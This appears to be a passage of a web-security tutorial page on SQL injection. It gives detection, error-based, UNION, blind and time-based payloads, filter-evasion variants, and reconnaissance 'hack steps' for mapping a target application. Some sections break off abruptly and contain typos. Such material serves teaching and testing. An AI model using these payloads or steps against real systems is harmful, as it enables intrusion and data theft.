<p>The double dash has caused the password check to be “commented out” so that it has no effect. Attacker has altered the intended logic of the statement and they could use this to bypass authentication, cause the database to leak confidential information or even execute functions such as executing operating system commands.</p>

<div class="section" id="detecting-vulnerable-functions">
<h2>Detecting Vulnerable Functions<a class="headerlink" href="#detecting-vulnerable-functions" title="Permalink to this headline">¶</a></h2>
<p>A effective way to do detect vulnerable functions is to alter the query in such a way that we have successfully injected into SQL and possibly see a visible result. e.g. SQL-like syntax being parsed in the expected way.</p>
<p>Consider the following query which loads a news article from the database to display on an fictitious web application:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>SELECT id,title,content FROM tblArticles WHERE id=$input
</pre></div>
</div>
<p>which is accessed through the following URL:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://sql.example.org/news?id=100
</pre></div>
</div>
<p>Now a simple way to determine is the parameter “id” is vulnerable to injection would be would be to try the following URLs and see how the server reacts:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://sql.example.org/news?id=100
http://sql.example.org/news?id=101
http://sql.example.org/news?id=101-1
</pre></div>
</div>
<ul class="simple">
<li>If the server is appropriately vulnerable it would be expected that the first and second URL show different articles whereas the third one is evaluated by the database and produces the same output as the first URL.</li>
<li>If the statement 101-1 is not evaluated then there’ll be a notable change in output.</li>
</ul>
<p>The above example, obviously, will only work on integer inputs, if the id parameter was instead a string input like this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://sql.example.org/news?page=example
</pre></div>
</div>
<p>With the above case it’s possible to utilize string concatenation in a similar way, where if the string is evaluated and concatenated then the output should not change whereas if it is no evaluated then a noticeable change in output will occur. The method of concatenation differs between back-end database types however if one works you have the added benefit of fingerprinting the database type!</p>
<p>MSSQL</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>exa&#39;+&#39;mple
With URLs a + is space, use %2b instead (URI encoded plus sign)!
</pre></div>
</div>
<p>MySQL</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>exa&#39; &#39;mple (that&#39;s a space between two apostrophes)
</pre></div>
</div>
<p>Oracle</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>exa&#39;||&#39;mple
</pre></div>
</div>
<p>An additional way of detecting of detecting functions that are vulnerable is to concatenate a simple conditional at the end of the input, such as:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>AND 1=1 --
AND 1=2 --
</pre></div>
</div>
<p>The idea with these payloads is that</p>
<ul class="simple">
<li>the top option of 1=1 will not alter the logic of the query in anyway (as 1 does in fact equal 1) although</li>
<li>the second payload will break the query and therefore the application would operate in a noticeably different way, such as missing text on the page (and therefore a shorter content length), a faster response time, a visible error or a different status code.</li>
</ul>
<p>The application should also have the same effect regardless of what the conditional was, so 1=1, 2=2 and 3=3 should all have the same effect, as should payloads such as:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>AND (SELECT @@version)=(SELECT @@version) --
</pre></div>
</div>
<p>The above payload is useful because its very SQL-like and whilst there may be some application logic which interprets 1=1 it’s very unlikely that outside of a SQL injection context you’ll get the same response from the above payload. It’s important to note however, that this payload is vendor specific, so the above will work on MSSQL and MySQL but not PostgreSQL. There’s a suitable payload for each of the backends however. The PostgreSQL equivalent would be:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>AND (SELECT version())=(SELECT version()) --
</pre></div>

<h3>Error Based<a class="headerlink" href="#error-based" title="Permalink to this headline">¶</a></h3>
<p>Error-based SQL injection comes about when errors from the SQL database are exposed to the attacker by being embedded in application responses.</p>
<p>Detection is generally as simple as placing an apostrophe in the parameter an you’d receive an error along the lines of:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string
</pre></div>
</div>
<p>The exact error depends on the backend database. These errors can be controlled and by crafting input you can cause the error to contain data from the database itself. For example, if you are injecting into an integer input you can cause a type clash which will disclose information like this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>AND 1 in (SELECT @@version)
</pre></div>
</div>
<p>with input like this you’ll get an error along the following lines:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Conversion failed when converting the nvarchar value &#39;Microsoft SQL Server 2008 R2 (SP1) - 10.50.2500.0 (X64) Jun 17 2011 00:54:03 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.2 &lt;X64&gt; (Build 9200: ) (Hypervisor)&#39; to data type int.
</pre></div>
</div>
<p>This works as the database attempts to convert the string to an integer, cannot, and throws an error that reveals the information.</p>
<p>Example:</p>
<p>Let’s say there’s a website with</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://widgetshop.com/widget/?id=1
</pre></div>
</div>
<p>and we try with</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://widgetshop.com/widget/?id=1 or x=1
</pre></div>
</div>
<p>and it gives us an error</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Exception Details: System.Data.SqlClient.SqlException: Invalid column name &#39;x&#39;
</pre></div>
</div>
<p>We can possibly extract table names and other details with this</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://widgetshop.com/widget/?id=convert(int,(select top 1 name from sysobjects where id=(select top 1 id from (select top 1 id from sysobjects where xtype=&#39;u&#39; order by id) sq order by id DESC)))
</pre></div>
</div>
<p>we get the error</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>System.Data.SqlClient.SqlException: Conversion failed when converting the varchar value &quot;TableName&quot; to data type int.
</pre></div>
</div>
<p>Let’s deconstruct the query from the URL:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>convert(int, (
   select top 1 name from sysobjects where id=(
     select top 1 id from (
       select top 1 id from sysobjects where xtype=&#39;u&#39; order by id
     ) sq order by id DESC
   )
  )
 )
</pre></div>
</div>
<ul class="simple">
<li>Working from the deepest nesting up, get the first record ID from the sysobjects table after ordering by ID.</li>
<li>From that collection, get the last ID (this is why it orders in descending) and pass that into the top select statement.</li>
<li>That top statement is then only going to take the table name and try to convert it to an integer.</li>
<li>The conversion to integer will almost certainly fail (please people, don’t name your tables “1” or “2” or any other integer for that matter!) and that exception then discloses the table name in the UI.</li>
</ul>
</div>
<div class="section" id="union-based">
<h3>Union Based<a class="headerlink" href="#union-based" title="Permalink to this headline">¶</a></h3>
<p>The UNION operator allows two or more SELECT statements to be combined, the idea being that a developer may run a query such as listing all of the products available in a store and an attacker can combine this with an additional query, such as listing all of the usernames and passwords in the customers table.
To utilise a union though the attacker must request the same number (and type) as the original query and therefore needs to know how many columns are being used. There are two ways to do this, the first is</p>
<ul class="simple">
<li>to use NULLs in place of the columns to determine how many columns there are, such as:</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>UNION SELECT NULL --
UNION SELECT NULL, NULL --
UNION SELECT NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL --
UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL --
</pre></div>
</div>
<p>and continue until you’ve determined how many columns there are – if you get the incorrect number of columns an error condition will occur and if you get the right number then the application will run unhindered. You can then swap out the NULL with datatypes to determine which ones are correct, such as:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>UNION SELECT &#39;abcd&#39;, NULL, NULL, NULL --
UNION SELECT 1, NULL, NULL, NULL --
</pre></div>
</div>
<p>Work them out one at a time until you end up with something like this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>UNION SELECT 1, &#39;string&#39;, &#39;string&#39;, &#39;string&#39; --
</pre></div>
</div>
<p>At this point you have a working SELECT statement where the output will be appended to the normal output the application gives!</p>
<p>If you’ve got a lot of columns and writing out all of those NULLs is too much like hard work there’s</p>
</div></blockquote>
<ul class="simple">
<li>another method of doing the original column count enumeration, using ORDER BYs. If you attempt to order by a column number which is higher than the number of columns it’ll throw an error. So you can start low and work up until you see an error:</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>ORDER BY 1 --
ORDER BY 2 --
ORDER BY 3 --
ORDER BY 4 -
</pre></div>
</div>
</div></blockquote>
<p><strong>Hints</strong></p>
<ul class="simple">
<li>Always use UNION with ALL because of image similar non-distinct field types. By default union tries to get records with distinct.</li>
<li>To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.</li>
<li>Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc.
* Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)</li>
</ul>
<p><strong>Finding Column Type</strong></p>
<ul>
<li><div class="first highlight-None notranslate"><div class="highlight"><pre><span></span>&#39; union select sum(columntofind) from users-- (S)

</pre></div>
</div>
</li>
</ul>
<blockquote>
<div>If you are not getting an error it means column is numeric.</div></blockquote>
<ul>
<li><p class="first">Also you can use CAST() or CONVERT()</p>

<h3>Blind SQL Injections<a class="headerlink" href="#blind-sql-injections" title="Permalink to this headline">¶</a></h3>
<p>About Blind SQL Injections</p>
<p>In a quite good production application generally you can not see error responses on the page, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections.</p>
<ul class="simple">
<li>Normal Blind, You can not see a response in the page, but you can still determine result of a query from response or HTTP status code</li>
<li>Totally Blind, You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common, though.</li>
</ul>
<p>In normal blinds you can use if statements or abuse WHERE query in injection (generally easier), in totally blinds you need to use some waiting functions and analyze response times. For this you can use WAIT FOR DELAY ‘0:0:10’ in SQL Server, BENCHMARK() and sleep(10) in MySQL, pg_sleep(10) in PostgreSQL, and some PL/SQL tricks in ORACLE</p>
</div>
<div class="section" id="blind-boolean">
<h3>Blind Boolean<a class="headerlink" href="#blind-boolean" title="Permalink to this headline">¶</a></h3>
<p>If the application gracefully errors, and it’s not possible to combine queries with UNION, then an attacker can use inference to determine the answer to queries about the database. The payloads we used earlier to prove the existence of injection are simple examples of this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>AND 1=1 --
AND 1=2 --
</pre></div>
</div>
<p>Essentially these are asking yes or no questions of the database and the result shows the answer.</p>
<ul class="simple">
<li>“Does 1=1”? Yes of course it does and therefore the normal output of the application will be visible.</li>
<li>“Does 1=2”? No it does not and therefore there should be a noticeable chance, this could be in the response length, time of execution, or HTTP response code.</li>
</ul>
<p>However we can expand up on this idea to ask more in-depth questions of the database, as long as we can phrase them as Yes/ No questions. For example, “Is the first letter of the current user the letter ‘a’”? That’d look something like:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>AND SUBSTR(SELECT user_name(), 1, 1)=&#39;a&#39; --
</pre></div>
</div>
<p>We can cycle through: b, c, d, e until we get a “true” response – then move on to the second character and so on. A time consuming and request intensive process but it can be automated quite easily with python (or Burp Intruder!)</p>
<p>The above check of</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>AND 1=1 --
</pre></div>
</div>
<p>can also be made by using</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>id = 5 &#39;or 1 = (select db_name ()) - =&gt; The name of the Database of the current user.
id = 5 &#39;or 1 = (select system_user) - =&gt; The name of the owner of the given database.
id = 5 &#39;and len (@@ version) = len (@@ version) - =&gt; true
id = 5 &#39;and (@@ TEXTSIZE&gt; @@ LANGID) - =&gt; true
</pre></div>
</div>
<p>For Example:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://bounty/yadayada.asp?id=8888&#39;+AND+(@@TEXTSIZE&gt;@@LANGID)+AND+&#39;1&#39;+LIKE+&#39;1 --&gt; page will be loaded normally.
http://bounty/yadayada.asp?id=8888&#39;+AND+(@@LANGID&gt;@@TEXTSIZE)+&#39;1&#39;+LIKE+&#39;1 --&gt; page will be blank
</pre></div>
</div>
<p>What we are trying to do is run a existing Transact-SQL inside a MSSQL where its return types is either integer or smallint. And usually, these return types already have their own value.</p>
<p>Such as an example:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>@@LANGID usually will be 0 for default (English language)
@@TEXTSIZE can be bigger than 1000
</pre></div>
</div>
<p><strong>If Statements</strong></p>
<p>Get response based on a if statement. This is one of the key points of Blind SQL Injection, also can be very useful to test simple stuff blindly and accurately. If statements of</p>
<p>MySQL</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>IF(condition,true-part,false-part) (M)
SELECT IF(1=1,&#39;true&#39;,&#39;false&#39;)

<p>SQL Server</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>IF condition true-part ELSE false-part (S)
IF (1=1) SELECT &#39;true&#39; ELSE SELECT &#39;false&#39;
</pre></div>
</div>
<p>Oracle</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>BEGIN
IF condition THEN true-part; ELSE false-part; END IF; END; (O)
IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
</pre></div>
</div>
<p>PostgreSQL</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>SELECT CASE WHEN condition THEN true-part ELSE false-part END; (P)
SELECT CASE WEHEN (1=1) THEN &#39;A&#39; ELSE &#39;B&#39;END;
</pre></div>
</div>
<p>If Statement SQL Injection Attack Samples</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>if ((select user) = &#39;sa&#39; OR (select user) = &#39;dbo&#39;) select 1 else select 1/0 (S)
</pre></div>
</div>
<p>This will throw an divide by zero error if current logged user is not “sa” or “dbo”</p>
<p>Examples:</p>
<p>These tests are simply good for blind sql injection and silent attacks.</p>
<ul>
<li><p class="first">product.asp?id=4 (SMO)</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>product.asp?id=5-1
product.asp?id=4 OR 1=1

</li>
<li><p class="first">product.asp?name=Book</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>product.asp?name=Bo&#39;%2b&#39;ok
product.asp?name=Bo&#39; || &#39;ok (OM)
product.asp?name=Book&#39; OR &#39;x&#39;=&#39;x
</pre></div>
</div>
</li>
</ul>
<p>Example:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://widgetshop.com/widget/?id=1 and 1=2
</pre></div>
</div>
<p>Firstly, it might just throw an exception if no record is returned. Secondly, the app might not throw an exception but then it also won’t display a record either because the equivalency is false.</p>
<p>Now let’s try</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>1 and
(
 select top 1 substring(name, 1, 1) from sysobjects where id=(
     select top 1 id from (
           select top 1 id from sysobjects where xtype=&#39;u&#39; order by id
       ) sq order by id desc
      )
 ) = &#39;a&#39;
</pre></div>
</div>
<p>It’s now an equivalency test to see if the first character of the table name is an “a” (we’re assuming a case-insensitive collation here). If this request gives us the same result as “?id=1” then it confirms that the
first table in sysobjects does indeed begin with an “a” as the equivalency has held true. If it gives us one of the earlier mentioned two scenarios (an error or shows no record), then we know that the table doesn’t begin
with an “a” as no record has been returned.</p>
<p>Now all of that only gives us the first character of the table name from sysobjects, when you want the second character then the substring statement needs to progress to the next position:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>select top 1 substring(name, 2, 1) from sysobjects where id=(
</pre></div>
</div>
<p>We can see it now starts at position 2 rather than position 1. Of course this is laborious; as well as enumerating through all the tables in sysobjects you end up enumerating through all the possible letters of the alphabet
until you get a hit then you have to repeat the process for each character of the table name.</p>
<p>A better way to this would be:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>1 and
(
 select top 1 ascii(lower(substring(name, 1, 1))) from sysobjects where id=(
     select top 1 id from (
           select top 1 id from sysobjects where xtype=&#39;u&#39; order by id
     ) sq order by id desc
   )
 ) &gt; 109
</pre></div>
</div>
<p>Difference here in that what’s it doing is rather than checking for an individual character match, it’s looking for where that character falls in the ASCII table. Actually, it’s first lowercasing the table name to
ensure we’re only dealing with 26 characters (assuming alpha-only naming, of course), then it’s taking the ASCII value of that character. In the example above, it then checks to see if the character is further down the table
than the letter “m” (ASCII 109) and then of course the same potential outcomes as described earlier apply (either a record comes back or it doesn’t).</p>
<p>The main difference is that rather than potentially making 26 attempts at guessing the character (and consequently making 26 HTTP requests), it’s now going to exhaust all possibilities in only 5 – you just keep halving the
possible ASCII character range until there’s only one possibility remaining.</p>
<p>For example, if greater than 109 then it must be between “n” and “z” so you split that (roughly) in half and go greater than 115. If that’s false then it must be between “n” and “s” so you split that bang in half and go greater
than 112. That’s true so there’s only three chars left which you can narrow down to one in a max of two guesses. Bottom line is that the max of 26 guesses (call it average of 13) is now done in only 5 as you simply just keep
halving the result set.</p>
<p>Another example from <a class="reference external" href="https://isc.sans.edu/diary/Exploiting+%28pretty%29+blind+SQL+injections/20733">Exploiting (pretty) blind SQL injections</a></p>
<p>SQL query through a request:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://10.10.10.10/application.aspx?queueID=743994
</pre></div>
</div>
<p>When the URL was opened regularly, in a browser, it was supposed to list certain transactions belonging to the numerical queueID in shown in the URL. The first issue was that the queueID we had to work with had no results!
It just returned an empty page (and there was no Direct Object Reference here, we had to use that particular queueID).</p>
<p>Putting 743994 OR 1=1 or a UNION didn’t work either – the application expected exactly certain values in the columns (not only column types) and all we could get with both of these cases was a nice, generic error screen.</p>
<p>So, to prove that there was a SQL injection vulnerability, the following two queries can satisfy our needs:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>queueID = 743994 AND 1=1
queueID = 743994 AND 1=2
queueID = 743995
queueID = 743994’
</pre></div>
</div>
<p>The first 3 queries all return a no results page. The last one returns the generic error page due to the SQL error that happened in the background. As with any blind SQL injection vulnerability, we need a true/false cases.
The true case can be the no results page, while the false case can be the error page. The only question that remains is how to provoke the error page – it’s easy to do manually by entering a ‘ character, but how to do it in SQL, programmatically?
Division by zero come to the rescue! If we divide something by zero, we can cause an SQL error, which will result with the generic error page.</p>
<p>Our exploitation now becomes the following:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>queueID = 743994 AND 1 = 1 / (select case when substr(banner, 1, 1) = &#39;A&#39; then 1 else 0 end from (select banner from v$version where banner like &#39;%Oracle%&#39;))
</pre></div>
</div>
<p>The query takes the database banner from v$version (where it has string Oracle in it). Then, from that line the first character is examined (specified by the substr() call) and compared to the letter ‘A’. If it is ‘A’, the query returns 1, otherwise it returns 0.
This will either result in 1 = 1 / 1 or 1 = 1 / 0. The former will display the no results page while the latter will display the error page.</p>
<p>Another example from <a class="reference external" href="https://isc.sans.edu/diary/Advanced+blind+SQL+injection+%28with+Oracle+examples%29/6409">Advanced Blind SQL Injection - Oracle</a></p>
<p><strong>Environment</strong></p>
<p>In our test environment, the developer receives one parameter. We’ll call it event and it can have two possible values, true or false. When called, it is used like this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>http://10.10.10.10/application.php?event=true
or
http://10.10.10.10/application.php?event=false
</pre></div>
</div>
<p>However, depending on the parameter (true or false or something else), the application will have different output and that allows us to see what’s going on behind. In other words, if the parameter is “true” the output will be
different from the case when the parameter is “abcd” (or “false”). And this is the basis of blind SQL injection – we want to make a difference between various SQL statements which will allow us to deduce the content of the database.</p>
<p>In typical blind SQL injection examples a timed delay is added to the attacker observes how long it takes for the query to execute. In this case it was not possible because we were dealing with stored procedures and some web
application firewalls which prevented from using UNION statements.</p>
<p><strong>Exploitation</strong></p>
<p>As we don’t know how exactly the stored procedure is called or what’s the backend database, the easiest way to determine that is to split the input parameter:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>event = tr&#39; || &#39;ue
</pre></div>
</div>
<p>This will cause the final input parameter to be ‘tr’ || ‘ue’ – the || operator in Oracle means concatenate so the parameter will actually be “true”.</p>
<p>This shows that the database is evaluating the SQL statement which allows us to enter some if/then cases that will, in the end, allow us to read data from the database. So let’s see how this is done in a bit more complex query:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>event = tr&#39; || (select case when substr(banner, 1, 1) = &#39;A&#39; then &#39;u&#39; else &#39;X&#39; end from (select banner from v$version where banner like &#39;%Oracle%&#39;)) || &#39;e
</pre></div>
</div>
<ul class="simple">
<li>The query takes the database banner from v$version (where it has string Oracle in it).</li>
<li>Then, from that line the first character is examined (specified by the substr() call) and compared to the letter ‘A’.</li>
<li>If it is ‘A’, the query returns ‘u’, otherwise it returns ‘X’.</li>
<li>Finally, this is concatenated so we have the following if/then case:</li>
</ul>
<blockquote>
<div><ul class="simple">
<li>If first character of the banner line containing string Oracle is ‘A’ return ‘u’ so the final string will be ‘true’.</li>
<li>Otherwise, return ‘X’ so the final string will be ‘trXe’.</li>
</ul>
</div></blockquote>
<p>Now, by examining the output of the application, it is possible to deduce if the query was successful or not.</p>
<p>Oracle has a handy table called all_sources which contains sources of stored procedures and functions. This may allow to retrieve source code!</p>
<p>SubstringToCharacterConversionToIncrementationOrDecrementationToCharacterConversionToStringConcatenation!!!!!!!</p>
<p>This might be useful in some scenarios</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>SUBSTRING(&lt;thing&gt;,X,1)
</pre></div>
</div>
<p>and then convert that to its numeric ASCII value:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>ASCII( SUBSTRING(&lt;thing&gt;,X,1) )
</pre></div>
</div>
<p>and then either increment or decrement that numeric value to the ASCII value of a character to get a result from:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>ASCII( SUBSTRING(&lt;thing&gt;,X,1) ) +/- Y
</pre></div>
</div>
<p>and then take that numeric ASCII value and convert THAT back to a character:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>CHAR( ASCII( SUBSTRING(&lt;thing&gt;,X,1) ) +/- Y )
</pre></div>
</div>
<p>and then perform string concatenation on that entire thing:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&quot;We&#39; + CHAR( ASCII( SUBSTRING(&lt;thing&gt;,X,1) ) +/- Y ) + &#39;dy&quot;
</pre></div>
</div>
<p>and then see if I get “Wendy” back as search result or nothing at all.</p>

<h3>Time-Based Blind<a class="headerlink" href="#time-based-blind" title="Permalink to this headline">¶</a></h3>
<p>If the application does not embed responses so you can’t use UNION, if it doesn’t show error messages an it’s not possible to determine the output of a boolean then there is still hope! If you can’t infer the output to a boolean through application responses you can add a notable difference yourself through time delays.</p>
<p>Effectively using IF statements and delays you can ask the application “Does A=A? If so, please delay your response by five seconds and if not then immediately respond”. Then by detecting lag in the response you’ll get your answer! Simple…but very time consuming…

<p>Evading user input filters whilst trying to exploit SQL injection is often a case of trying to format the same payloads but with different characters. Take the following payload for example:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&#39; AND 3&gt;2 --
</pre></div>
</div>
<p>We could rewrite this payload in a number of ways depending on which part of the payload was being filtered, for example with the greater-than sign, We could replace it using an encoded character:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&#39; AND 3%3E2 --
&#39; AND 3%253E2 --
&#39; AND 3%u003e2 --
</pre></div>
</div>
<p>Alternatively we could simply reformat the payload to achieve the same result, such as:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&#39; AND 2&lt;3 --
&#39; AND 2&lt;&gt;3 --
&#39; AND 2!=3 -- &#39; &#39; &#39; &#39; &#39; &#39; &#39;

<div class="section" id="id2">
<h2>Mapping the Application<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Configure your browser to use either Burp or WebScarab as a local proxy (see Chapter 20 for specific details about how to do this if you’re unsure).</li>
<li>Browse the entire application normally, attempting to visit every link/URL you discover, submitting every form, and proceeding through all multistep functions to completion. Try browsing with JavaScript enabled and disabled, and with cookies enabled and disabled. Many applications can handle various browser configurations, and you may reach different content and code paths within the application.</li>
<li>Review the site map generated by the proxy/spider tool, and identify any application content or functions that you did not browse manually. Establish how the spider enumerated each item. For example, in Burp Spider, check the Linked From details. Using your browser, access the item manually so that the response from the server is parsed by the proxy/spider tool to identify any further content. Continue this step recursively until no further content or functionality is identified.</li>
<li>Optionally, tell the tool to actively spider the site using all of the already enumerated content as a starting point. To do this, first identify any URLs that are dangerous or likely to break the application session, and configure the spider to exclude these from its scope. Run the spider and review the results for any additional content it discovers.</li>
</ol>
<p>The site map generated by the proxy/spider tool contains a wealth of information about the target application, which will be useful later in identifying the various attack surfaces exposed by the application.</p>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Make some manual requests for known valid and invalid resources, and identify how the server handles the latter.</li>
<li>Use the site map generated through user-directed spidering as a basis for automated discovery of hidden content.</li>
<li>Make automated requests for common filenames and directories within each directory or path known to exist within the application. Use Burp Intruder or a custom script, together with wordlists of common files and directories, to quickly generate large numbers of requests. If you have identified a particular way in which the application handles requests for invalid resources (such as a customized “file not found” page), configure Intruder or your script to highlight these results so that they can be ignored.</li>
<li>Capture the responses received from the server, and manually review them to identify valid resources.</li>
<li>Perform the exercise recursively as new content is discovered.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Review the results of your user-directed browsing and basic brute-force exercises. Compile lists of the names of all enumerated subdirectories, file stems, and file extensions.</li>
<li>Review these lists to identify any naming schemes in use. For example, if there are pages called AddDocument.jsp and ViewDocument.jsp, there may also be pages called EditDocument.jsp and RemoveDocument.jsp. You can often get a feel for developers’ naming habits just by reading a few examples. For example, depending on their personal style, developers may be verbose (AddANewUser.asp), succinct (AddUser.asp), use abbreviations (AddUsr.asp), or even be more cryptic (AddU.asp). Getting a feel for the naming styles in use may help you guess the precise names of content you have not already identified.</li>
<li>Sometimes, the naming scheme used for different content employs identifiers such as numbers and dates, which can make inferring hidden content easy. This is most commonly encountered in the names of static resources, rather than dynamic scripts. For example, if a company’s website links to AnnualReport2009.pdf and AnnualReport2010.pdf, it should be a short step to identifying what the next report will be called. Somewhat incredibly, there have been notorious cases of companies placing files containing financial reports on their web servers before they were publicly announced, only to have wily journalists discover them based on the naming scheme used in earlier years.</li>
<li>Review all client-side code such as HTML and JavaScript to identify any clues about hidden server-side content. These may include HTML comments related to protected or unlinked functions, HTML forms with disabled SUBMIT elements, and the like. Often, comments are automatically generated by the software that has been used to generate web content, or by the platform on which the application is running. References to items such as server-side include files are of particular interest. These files may actually be publicly downloadable and may contain highly sensitive information such as database connection strings and passwords. In other cases, developers’ comments may contain all kinds of useful tidbits, such as database names, references to back-end components, SQL query strings, and so on. Thick-client components such as Java applets and ActiveX controls may also contain sensitive data that you can extract</li>
<li>Add to the lists of enumerated items any further potential names conjectured on the basis of the items that you have discovered. Also add to the file extension list common extensions such as txt, bak, src, inc, and old, which may uncover the source to backup versions of live pages. Also add extensions associated with the development languages in use, such as .java and .cs, which may uncover source files that have been compiled into live pages. (See the tips later in this chapter for identifying technologies in use.)</li>
<li>Search for temporary files that may have been created inadvertently by developer tools and file editors. Examples include the .DS_Store file, which contains a directory index under OS X, file.php~1, which is a temporary file created when file.php is edited, and the .tmp file extension that is used by numerous software tools.</li>
<li>Perform further automated exercises, combining the lists of directories, file stems, and file extensions to request large numbers of potential resources. For example, in a given directory, request each file stem combined with each file extension. Or request each directory name as a subdirectory of every known directory.</li>
<li>Where a consistent naming scheme has been identified, consider performing a more focused brute-force exercise. For example, if AddDocument .jsp and ViewDocument.jsp are known to exist, you may create a list of actions (edit, delete, create) and make requests of the form XxxDocument.jsp. Alternatively, create a list of item types (user, account, file) and make requests of the form AddXxx.jsp.</li>
<li>Perform each exercise recursively, using new enumerated content and patterns as the basis for further user-directed spidering and further automated content discovery. You are limited only by your imagination, time available, and the importance you attach to discovering hidden content within the application you are targeting.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Use several different search engines and web archives (listed previously) to discover what content they indexed or stored for the application you are attacking.</li>
<li>When querying a search engine, you can use various advanced techniques to maximize the effectiveness of your research. The following suggestions apply to Google. You can find the corresponding queries on other engines by selecting their Advanced Search option. n site:www.wahh-target.com returns every resource within the target site that Google has a reference to. n site:www.wahh-target.com login returns all the pages containing the expression login. In a large and complex application, this technique can be used to quickly home in on interesting resources, such as site maps, password reset functions, and administrative menus. n link:www.wahh-target.com returns all the pages on other websites and applications that contain a link to the target. This may include links to old content, or functionality that is intended for use only by third parties, such as partner links. n related:www.wahh-target.com returns pages that are “similar” to the target and therefore includes a lot of irrelevant material. However, it may also discuss the target on other sites, which may be of interest.</li>
<li>Perform each search not only in the default Web section of Google, but also in Groups and News, which may contain different results.</li>
<li>Browse to the last page of search results for a given query, and select Repeat the Search with the Omitted Results Included. By default, Google attempts to filter out redundant results by removing pages that it believes are sufficiently similar to others included in the results. Overriding this behavior may uncover subtly different pages that are of interest to you when attacking the application.</li>
<li>View the cached version of interesting pages, including any content that is no longer present in the actual application. In some cases, search engine caches contain resources that cannot be directly accessed in the application without authentication or payment.</li>
<li>Perform the same queries on other domain names belonging to the same organization, which may contain useful information about the application you are targeting. If your research identiﬁ es old content and functionality that is no longer linked to within the main application, it may still be present and usable. The old functionality may contain vulnerabilities that do not exist elsewhere within the application. Even where old content has been removed from the live application, the content obtained from a search engine cache or web archive may contain references to or clues about other functionality that is still present within the live application and that can be used to attack it.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Compile a list containing every name and e-mail address you can discover relating to the target application and its development. This should include any known developers, names found within HTML source code, names found in the contact information section of the main company website, and any names disclosed within the application itself, such as administrative staff.</li>
